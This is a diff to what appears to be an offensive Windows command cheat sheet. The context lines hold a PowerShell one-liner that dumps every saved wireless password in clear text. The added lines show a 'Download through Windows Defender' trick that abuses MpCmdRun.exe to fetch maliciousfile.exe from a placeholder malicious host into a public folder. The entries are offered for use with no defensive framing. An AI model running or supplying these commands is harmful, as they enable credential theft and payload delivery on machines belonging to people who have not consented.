@@ -36,5 +36,7 @@ MSIEXEC Download and Execute
 Grab all wireless passwords with PS
 <pre><code>(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize</pre></code>
 
+Download through Windows Defender
+<pre><code>"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -irl https://maliciousip/maliciousfile.exe -Path C:\Users\Public\maliciousfile.exe</pre></code>
 
 P.S These were not made by me.
